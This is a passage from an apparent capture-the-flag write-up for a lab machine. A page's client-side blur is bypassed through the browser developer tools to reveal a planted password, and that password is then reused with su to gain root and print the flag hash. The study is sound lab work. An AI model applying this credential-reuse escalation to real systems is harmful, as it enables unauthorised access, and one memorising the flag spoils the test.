        <p>The hacker has provided what he claims to be Usain Bolt's account password as proof of his achievement. For security reasons and to protect the athlete's privacy, the content below is blurred and requires a subscription to be revealed.</p>

        <div id="protected-content" class="blurred"></div>
        <button class="subscribe-btn" onclick="showOverlay()">Sign up for more</button>

        <div id="overlay" class="overlay" onclick="hideOverlay()">
            <p>Subscription currently unavailable</p> ←
        </div>
    </div>

    <script>
        const csrfToken = '8b38babfecfeadd39c4a5a3f370bb6659ed6d3561252e222d9986e3ad3e9eb74';

        document.addEventListener('DOMContentLoaded', function() {
            fetch('get_protected_content.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ token: csrfToken })
            })
            .then(response => response.json())
            .then(data => {
                if (data.content) {
                    document.getElementById('protected-content').setAttribute('data-content', data.content);
                } else {
                    console.error('Failed to load content:', data);
                }
            })
            .catch(error => console.error('Error fetching content:', error));
        });

        function showOverlay() {
            document.getElementById('overlay').classList.add('show-overlay');
        }

        function hideOverlay() {
            document.getElementById('overlay').classList.remove('show-overlay');
        }

        window.activateFeature = function() { ←
            var contentDiv = document.getElementById('protected-content');
            var protectedContent = contentDiv.getAttribute('data-content');
            if (protectedContent) { ←
                contentDiv.innerHTML = protectedContent;
                contentDiv.style.background = 'none';
                contentDiv.style.color = '#333';
                contentDiv.classList.remove('blurred'); ←
                hideOverlay();
            } else {
                console.error('No content available');
            }
        };

        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                hideOverlay();
            }
        });
    </script>
</body>
</html>
```

![Victim: vanity](https://img.shields.io/badge/Victim-vanity-64b5f6?logo=linux&logoColor=white)

```
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50652 Accepted
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50652 [200]: GET /
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50652 Closing
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50660 Accepted
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50660 [200]: GET /blurred-text.png
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50660 Closing
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50666 Accepted
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50666 [200]: POST /get_protected_content.php ←
[Wed Oct  9 15:17:08 2024] 192.168.56.118:50666 Closing
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`curl -s http://192.168.56.135:8000/get_protected_content.php`:
```
{"error":"Forbidden"} ←
```

`curl -I http://192.168.56.135:8000/get_protected_content.php`:
```
HTTP/1.1 403 Forbidden ←
Host: 192.168.56.135:8000
Date: Wed, 09 Oct 2024 13:20:36 GMT
Connection: close
X-Powered-By: PHP/8.2.20
Set-Cookie: PHPSESSID=42lktfjph6e8t6uh3c39i4070s; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8
```

`firefox` > `http://http://192.168.56.135:8000/`

`<Ctrl+Shift+I>` (`Inspect`) > `Network` > `Clear` > `Reload` > `get_protected_content.php`:
```
{"content":"As part of a recent cyber attack, we managed to access Usain Bolt's personal account. The password associated with his account is **LightningBolt123<\/strong>. This breach demonstrates the vulnerabilities of even the most secure systems."}** ←
```

<🔄 Alternative Step.>

`<Ctrl+Shift+I>` (`Inspect`) > `Console` > `window.activateFeature()`:
```
# Olympic Athlete Password Leaked!

A hacker claims to have obtained the password of a famous Olympic athlete. According to the hacker, he managed to hack into the personal account of the famous sprinter, **Usain Bolt**!

The hacker has provided what he claims to be Usain Bolt's account password as proof of his achievement. For security reasons and to protect the athlete's privacy, the content below is blurred and requires a subscription to be revealed.

As part of a recent cyber attack, we managed to access Usain Bolt's personal account. The password associated with his account is **LightningBolt123**. This breach demonstrates the vulnerabilities of even the most secure systems. ←
```

</🔄 Alternative Step.>

`su root`:
```
Password: ←
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 36
4 drwx------  5 root root 4096 Jul 29 16:18 ./
4 drwxr-xr-x 19 root root 4096 Jul 29 16:04 ../
0 lrwxrwxrwx  1 root root    9 Mar  9  2024 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 Jul 29 13:48 .bashrc
4 drwx------  2 root root 4096 Jul 29 13:48 .cache/
4 -rw-------  1 root root   20 Jul 29 13:48 .lesshst
4 drwxr-xr-x  3 root root 4096 Jul 29 16:17 .local/
4 -rw-r--r--  1 root root  161 Jul 29 13:48 .profile
4 -rwx------  1 root root   33 Jul 29 13:48 root.txt ←
4 drwx------  2 root root 4096 Jul 29 13:48 .ssh/
```

`cat ./root.txt`:
```
cbd60dab37bc85e1f7ea4b5c9c4eed90 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
